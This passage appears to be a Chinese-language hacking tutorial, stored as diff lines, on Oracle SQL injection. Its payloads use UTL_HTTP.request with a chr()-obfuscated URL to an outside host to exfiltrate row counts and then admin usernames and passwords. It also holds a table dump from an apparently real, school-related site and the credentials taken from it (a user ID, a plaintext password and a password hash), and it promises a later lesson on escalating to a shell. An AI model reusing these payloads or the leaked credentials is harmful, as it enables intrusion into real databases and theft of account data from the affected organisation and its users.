UTL_HTTP.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select count(列名) from 表名 where rownum=1))=1--
+
+只有一个记录
+
+第一个用户名：
+
+and UTL_HTTP.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select USERNAME from ADMIN where rownum=1))=1--
+
+注意表的大少写。oracle都是大写的
+pid=1
+userid=51124
+pwd=253577431  内容就全出来了。如果有两条记录ADMIN where rownum=1 PID<>'1'))=1--  或： ADMIN where rownum=1 PWD<>'253577431'))=1-- 随便一个列排除就可以爆出第二个。
+
+
+密码：
+
+and UTL_HTTP.request(chr(104)%7C%7Cchr(116)%7C%7Cchr(116)%7C%7Cchr(112)%7C%7Cchr(58)%7C%7Cchr(47)%7C%7Cchr(47)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(119)%7C%7Cchr(46)%7C%7Cchr(110)%7C%7Cchr(111)%7C%7Cchr(115)%7C%7Cchr(101)%7C%7Cchr(99)%7C%7Cchr(46)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(103)%7C%7Cchr(47)%7C%7Cchr(112)%7C%7Cchr(114)%7C%7Cchr(111)%7C%7Cchr(100)%7C%7Cchr(117)%7C%7Cchr(99)%7C%7Cchr(116)%7C%7Cchr(47)%7C%7Cchr(111)%7C%7Cchr(114)%7C%7Cchr(97)%7C%7Cchr(99)%7C%7Cchr(108)%7C%7Cchr(101)%7C%7Cchr(95)%7C%7Cchr(100)%7C%7Cchr(97)%7C%7Cchr(116)%7C%7Cchr(97)%7C%7Cchr(46)%7C%7Cchr(112)%7C%7Cchr(104)%7C%7Cchr(112)%7C%7Cchr(63)%7C%7Cchr(105)%7C%7Cchr(100)%7C%7Cchr(61)%7C%7C(select PASSWORD from ADMIN where rownum=1))=1--
+
+
+好了，就先简单讲这些吧，这些语句我会打包给你们。慢慢理解。
+
+很长时间了。以后会讲到提升数据裤用户权限直接拿shell。
+
+
+
+
+
+这个工具是通过返回的页面正常与否来判断他的每一个ASC码所以会很慢。这个点不能确定字段位置。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+AFFICHE
+APPEAR
+AQ$_INTERNET_AGENTS
+AQ$_INTERNET_AGENT_PRIVS
+AQ$_QUEUES
+AQ$_QUEUE_TABLES
+AQ$_SCHEDULES
+ARCHIVES1
+ASSISTANTKIND
+ASSORT
+BBSUSERS
+BEATITUDES
+BIGNEWS
+CAPTIONCZ
+CAPTIONTITLE
+CHIEFKIND
+CHUBANSHE
+CKUSERS
+COMMEND
+COMMENTCZ
+COMMENTON
+COMMENTON2
+COMMERCE
+COMMUNICATIONS
+COMMUNICATIONS2
+COMMUNICATIONS3
+COMMUNICATIONS4
+CONSULTATION
+CONTEST
+CONTRIBUTE
+COPETITION_DYNAMIC
+CORPORATION
+CORPORATIONS
+DCAPTION
+DEF$_AQCALL
+DEF$_AQERROR
+DEF$_CALLDEST
+DEF$_DEFAULTDEST
+DEF$_DESTINATION
+DEF$_ERROR
+DEF$_LOB
+DEF$_ORIGIN
+DEF$_PROPAGATOR
+DEF$_PUSHED_TRANSACTIONS
+DEF$_TEMP$LOB
+DEMAND
+DIAOCHATI1
+DIAOCHATI2
+DIAOCHAYONGHU
+DOTS
+DOTSS
+DRAWING
+DRAWINGBT
+DRAWINGPL
+EDITS
+EDUTEACHERS
+ENROL
+ENROL_DZB
+FENLEI
+FIVETABLE
+FOCUS
+FOCUS1   我就随便找一个表来爆了，找个短的，ASC码会短点。
+FOSTERS
+FOURTABLE
+GONGGAO
+GOODS
+GUILD
+HELP
+IMGS
+INFORM
+IPCOUNT
+IPS          找他吧
+ITEM
+JOINS
+JYPX
+KIND1
+LEAVEWORD
+LEAVEWORDS
+LIBRARY
+LIUYAN
+LOGMNRC_DBNAME_UID_MAP
+LOGMNRC_GSII
+LOGMNRC_GTCS
+LOGMNRC_GTLO
+LOGMNR_AGE_SPILL$
+LOGMNR_ATTRCOL$
+LOGMNR_ATTRIBUTE$
+LOGMNR_CCOL$
+LOGMNR_CDEF$
+LOGMNR_COL$
+LOGMNR_COLTYPE$
+LOGMNR_DICTIONARY$
+LOGMNR_DICTSTATE$
+LOGMNR_HEADER1$
+LOGMNR_HEADER2$
+LOGMNR_ICOL$
+LOGMNR_IND$
+LOGMNR_INDCOMPART$
+LOGMNR_INDPART$
+LOGMNR_INDSUBPART$
+LOGMNR_LOB$
+LOGMNR_LOBFRAG$
+LOGMNR_LOG$
+LOGMNR_OBJ$
+LOGMNR_PROCESSED_LOG$
+LOGMNR_RESTART_CKPT$
+LOGMNR_RESTART_CKPT_TXINFO$
+LOGMNR_SESSION$
+LOGMNR_SPILL$
+LOGMNR_TAB$
+LOGMNR_TABCOMPART$
+LOGMNR_TABPART$
+LOGMNR_TABSUBPART$
+LOGMNR_TS$
+LOGMNR_TYPE$
+LOGMNR_UID$
+LOGMNR_USER$
+LOGSTDBY$APPLY_MILESTONE
+LOGSTDBY$APPLY_PROGRESS
+LOGSTDBY$EVENTS
+LOGSTDBY$PARAMETERS
+LOGSTDBY$PLSQL
+LOGSTDBY$SCN
+LOGSTDBY$SKIP
+LOGSTDBY$SKIP_SUPPORT
+LOGSTDBY$SKIP_TRANSACTION
+MEDIA
+MEINFOS
+MESSAGEDS
+MVIEW$_ADV_AJG
+MVIEW$_ADV_BASETABLE
+MVIEW$_ADV_CLIQUE
+MVIEW$_ADV_ELIGIBLE
+MVIEW$_ADV_EXCEPTIONS
+MVIEW$_ADV_FILTER
+MVIEW$_ADV_FILTERINSTANCE
+MVIEW$_ADV_FJG
+MVIEW$_ADV_GC
+MVIEW$_ADV_INDEX
+MVIEW$_ADV_INFO
+MVIEW$_ADV_JOURNAL
+MVIEW$_ADV_LEVEL
+MVIEW$_ADV_LOG
+MVIEW$_ADV_OUTPUT
+MVIEW$_ADV_PARAMETERS
+MVIEW$_ADV_PARTITION
+MVIEW$_ADV_PLAN
+MVIEW$_ADV_PRETTY
+MVIEW$_ADV_ROLLUP
+MVIEW$_ADV_SQLDEPEND
+MVIEW$_ADV_TEMP
+MVIEW$_ADV_WORKLOAD
+NEWS
+NEWS1
+NEWS2
+NEWSTO2
+NOMINATE
+ONECAPTION
+ONETABLE
+ORDERLIST
+ORDERS
+ORDER_S
+PERSON
+PERSONNEWS
+PERSONTITLE
+PLAN
+PLAN_TABLE
+POLICY
+POPEDOM
+PRESS
+PROCUDE
+PUBLISHER
+PWDS
+QIYERONGZI
+RECOMMEND
+REGISTER
+RENDACONTEST
+RENDASOLUTION
+RENDAUSERS
+REPCAT$_AUDIT_ATTRIBUTE
+REPCAT$_AUDIT_COLUMN
+REPCAT$_COLUMN_GROUP
+REPCAT$_CONFLICT
+REPCAT$_DDL
+REPCAT$_EXCEPTIONS
+REPCAT$_EXTENSION
+REPCAT$_FLAVORS
+REPCAT$_FLAVOR_OBJECTS
+REPCAT$_GENERATED
+REPCAT$_GROUPED_COLUMN
+REPCAT$_INSTANTIATION_DDL
+REPCAT$_KEY_COLUMNS
+REPCAT$_OBJECT_PARMS
+REPCAT$_OBJECT_TYPES
+REPCAT$_PARAMETER_COLUMN
+REPCAT$_PRIORITY
+REPCAT$_PRIORITY_GROUP
+REPCAT$_REFRESH_TEMPLATES
+REPCAT$_REPCAT
+REPCAT$_REPCATLOG
+REPCAT$_REPCOLUMN
+REPCAT$_REPGROUP_PRIVS
+REPCAT$_REPOBJECT
+REPCAT$_REPPROP
+REPCAT$_REPSCHEMA
+REPCAT$_RESOLUTION
+REPCAT$_RESOLUTION_METHOD
+REPCAT$_RESOLUTION_STATISTICS
+REPCAT$_RESOL_STATS_CONTROL
+REPCAT$_RUNTIME_PARMS
+REPCAT$_SITES_NEW
+REPCAT$_SITE_OBJECTS
+REPCAT$_SNAPGROUP
+REPCAT$_TEMPLATE_OBJECTS
+REPCAT$_TEMPLATE_PARMS
+REPCAT$_TEMPLATE_REFGROUPS
+REPCAT$_TEMPLATE_SITES
+REPCAT$_TEMPLATE_STATUS
+REPCAT$_TEMPLATE_TARGETS
+REPCAT$_TEMPLATE_TYPES
+REPCAT$_USER_AUTHORIZATIONS
+REPCAT$_USER_PARM_VALUES
+RESEARCH1
+RESEARCH2
+RESPONSE
+SCHOOL
+SCHOOLINFOS
+SCHOOLINFOS1
+SHIDAXINWEN
+SHIWUSUO
+SHOPPINGS
+SHOP_USER
+SHUCHENG
+SOLUTION
+SORT
+SQLPLUS_PRODUCT_PROFILE
+SWOFUSER
+TEACHER
+TEACHERCAPTION
+TEACHERS
+TEACHERS1
+TEMPORARY
+THESIS
+THESIS1
+THREETABLE
+TITLENEWS
+TOAPPLYFORAJOB
+TWOCAPTION
+TWOTABLE
+USER1
+USERS
+YCJY
+YONGYOU
+换个表试下，晕了。
+
+
+CKUSERS
+用户名:DUDUBO                       
+密码： 372e5110e03950685500ec71c8811819
+
+PWSD
+'PID','USERID','PWD'
+
+51124
+253577431
+
+
+
+
+
